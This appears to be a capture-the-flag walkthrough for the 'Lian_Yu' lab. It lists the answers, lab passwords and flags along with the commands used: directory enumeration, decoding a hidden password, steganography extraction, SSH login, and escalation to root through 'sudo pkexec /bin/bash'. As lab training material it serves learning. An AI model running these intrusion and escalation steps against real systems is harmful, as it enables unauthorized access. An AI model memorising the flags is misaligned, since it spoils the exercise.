@@ -1,0 +1,63 @@
+
+							      Lian_Yu
+							   =============
+
+1. Deploy the VM and Start the Enumeration.
+ans: auto-complete
+
+2. What is the Web Directory you found?
+ans: 2100
+command: nmap -sC -sV 10.10.72.33 -o nmap.txt
+command: gobuster dir -u 10.10.72.33 --wordlist /usr/share/wordlists/dirb/big.txt -o gobuster.txt
+command: gobuster dir -u 10.10.72.33/island --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster2.txt 
+command: gobuster dir -u 10.10.72.33/island/2100 -t 30 -x ticket --wordlist /usr/share/wordlists/dirbuster
+	 /directory-list-2.3-medium.txt -o gobuster3.txt
+
+3. what is the file name you found?
+ans: green_arrow.ticket
+command: gobuster dir -u 10.10.72.33/island/2100 -t 30 -x ticket --wordlist /usr/share/wordlists/dirbuster
+	 /directory-list-2.3-medium.txt -o gobuster3.txt
+
+4. what is the FTP Password?
+ans: !#th3h00d
+     (go to 10.10.72.33/island/2100 view page souce and copy base58 stuff)
+     (go cyberchef and select from base58 and past stuff)
+
+5. what is the file name with SSH password?
+ans: shado
+command: ftp 10.10.72.33 (vigilante:!#th3h00d) (username is on the website)
+command: get * (download all files)
+command: eog * (see all images)
+command: exiftool Leave_me_alone.png (File format error)
+command: hexeditor Leave_me_alone.png
+	 (search google png hax header and compare each other)
+	 (replace value with this 89 50 4E 47 0D 0A 1A 0A and save) 
+command: exiftool Leave_me_alone.png
+command: eog Leave_me_alone.png
+command: steghide extract -sf aa.jpg (password found in Leave_me_alone.png)
+command: unzip ss.zip
+command: cat passwd.txt
+command: cat shado
+
+
+6. user.txt
+ans: THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
+command: ftp 10.10.72.33 (vigilante:!#th3h00d)
+command: cd /home
+command: ls (users:slade,vigilante)
+command: ssh slade@10.10.72.33 (password is M3tahuman (found in shado file))
+command: ls
+command: cat user.txt
+
+7. root.txt
+ans: THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
+command: sudo -l (password is M3tahuman)
+	 ((root) PASSWD: /usr/bin/pkexec)
+command: man pkexec (command If username is not specified, then the program will be executed as the administrative
+         super user, root.)
+command: sudo /usr/bin/pkexec /bin/bash
+command: cat /root/root.txt
+
+
+
+
